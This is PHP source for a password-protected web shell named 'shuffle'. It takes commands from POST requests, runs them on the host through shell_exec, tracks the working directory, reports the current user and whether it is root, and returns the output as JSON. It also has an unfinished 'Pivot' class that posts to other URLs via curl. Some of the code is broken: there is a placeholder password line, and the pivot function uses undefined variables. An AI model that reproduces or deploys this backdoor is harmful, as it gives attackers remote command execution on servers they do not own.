<?php
#Classes
session_name("shuffle_id");
session_start();

	Class System{
	<password>;		
	public function get_password(){
			return self::$password;
		}
	}
	Class Conect extends System {
		public function __construct($get,$post){
			$this->pass = isset($_POST['pass']) ? $_POST['pass'] : null ;
		}
		public function connection(){
			if(!empty($this->pass)){
				if($this->pass == $this->get_password() AND $_POST['cmd'] == 'shuffle-auth'){
					$hash = md5(date('r', time()));
					setcookie("shuffle_id",$hash, time() + (86400 * 30), "/");
					$response =  array('response' => "true",'connection'=> array('cookie' => array("shuffle_id"=> $hash )));
				}else{
					$response = array('response' => "false",'msg'=>'Invalid Password');
				}
			}else{
				$response = array('response' => "false",'msg'=>'No password received');
			}
			return $response;
		}
		public function conection(){
			if($this->pass == $this->get_password()){
				$response =  array('response' => "true");
			}else{
				$response = array('response' => "false",'msg'=>'Invalid Password');
			}
			return $response;
		}
	}

	Class Server extends Conect {
		public function __construct($get,$conection){
			if(!empty($get['cmd'])){
				$this->cmd = $get['cmd'];
			}else{
				$this->cmd = "";
			}
			$this->conection = $conection;
			$this->pwd = $this->set_pwd();
		}
		public function execute(){
			if($this->conection['response'] == "true"){
				if($this->set_execute()){
					return 'Directory Not Found';
				}else{
					if(!empty(shell_exec($this->cmd))){
						#chdir($_SESSION['pwd']);
						return shell_exec("cd ".$_SESSION['pwd'].";".$this->cmd);
					}else{
						return 'Command Not Found';
					}
				}
			}else{
				return $this->conection['response'];
			}
		}
		public function set_execute(){
			$cmd = explode(" ",$this->cmd);
			if($cmd[0] == "cd"){
				$pwd = $this->set_pwd($cmd[1]);
				if($pwd == true){
					return true;
				}else{
					return false;
				}
			}else{
				return false;
			}
		}
		public function print_working_directory(){
			$pwd_current = str_replace("../", "", $_SESSION['pwd']);
			if($pwd_current == getcwd()){
				$pwd = "~";
			}else{
				$pwd = $pwd_current;
			}
			return $pwd;
		}
		public function set_pwd($pwd = null){
			if(empty($_SESSION['pwd'])){
				$_SESSION['pwd'] = trim(getcwd(), "/");
				$_SESSION['pwd'] = "/".$_SESSION['pwd'];
			}elseif($pwd != null){
				if($pwd == ".."){
					$foward = $this->foward_dir();
					if($this->folder_exist($foward) != false){
						$_SESSION['pwd'] = trim($foward, "/");
						$_SESSION['pwd'] = "/".$_SESSION['pwd'];
						return true;
					}else{
						return false;
					}
				}else{
					if(strpos($pwd,"/")){
						$pwd = str_replace($pwd, "/", "");
						$pwd = "/".$pwd;
					}else{
						$pwd = "/".$pwd;
					}
					if($this->folder_exist($_SESSION['pwd'].$pwd) != false){
						$_SESSION['pwd'] = $_SESSION['pwd'].$pwd;
						return true;
					}else{
						return false;
					}
				}
			}
		}
		private function make_dir($dir_array){
			$set = "";
			for($x=0;$x<count($dir_array);$x++){
				$set .= $dir_array[$x]."/";
			}
			return $set;
		}
		private function foward_dir(){
			$current = explode("/",$_SESSION['pwd']);
			
			unset($current[count($current)-1]);
			$_SESSION['pwd'] = "/".implode("/", $current)."/";
			return $this->make_dir($current);
		}
		private function rewind_dir(){
			
		}
		public function folder_exist($folder){
		    $path = realpath($folder);
		    // If it exist, check if it's a directory
		    return ($path !== false AND is_dir($path)) ? $path : false;
		}
		public function get_server_name(){
			return $_SERVER['SERVER_NAME'];
		}
		public function get_user_name(){
			return exec("whoami");
		}
		public function get_user_bash(){
			if(exec("whoami") == "root"){
				$user_bash = "#";
			}else{
				$user_bash = "$";
			}
			return $user_bash;
		}
	}
	Class Pivot extends Conect {
		public function __construct($get,$conection){
			if(!empty($get['cmd'])){
				$this->cmd = $get['cmd'];
			}else{
				$this->cmd = "";
			}
			$this->conection = $conection;
		}
		public function send($url){
			$url = $file_name;
			$fields = array(
			            '__VIEWSTATE'=>urlencode($state),
			            '__EVENTVALIDATION'=>urlencode($valid),
			            'btnSubmit'=>urlencode('Submit')
			        );
			
			//url-ify the data for the POST
			foreach($fields as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
			$fields_string = rtrim($fields_string,'&');
			
			//open connection
			$ch = curl_init();
			
			//set the url, number of POST vars, POST data
			curl_setopt($ch,CURLOPT_URL,$url);
			curl_setopt($ch,CURLOPT_POST,count($fields));
			curl_setopt($ch,CURLOPT_POSTFIELDS,$fields_string);
			
			//execute post
			$result = curl_exec($ch);
			print $result;
		}
	}

#Class Instance
if(isset($_POST['cmd'])){
	if($_POST['cmd'] == "shuffle-auth"){
		$conection = new Conect($_GET,$_POST);
		$response = $conection->connection();
		echo json_encode($response);
		exit();
	}
	if($_POST['cmd'] == "shuffle-pivot"){
		$conection = new Conect($_GET,$_POST);
		echo json_encode($response);
		exit();
	}
}
$conection = new Conect($_GET,$_POST);
$server = New Server($_POST,$conection->conection());


		$json = array("response" => "200",
					  "server_info" => array("user"=>$server->get_user_name(),
					  "server_name" => $server->get_server_name(),
					  "user_bash" => $server->get_user_bash(),
					  "pwd"=>$server->print_working_directory()),
					  "command" => $server->execute(),
					  );
		//Response to Shelly				
		echo json_encode($json);
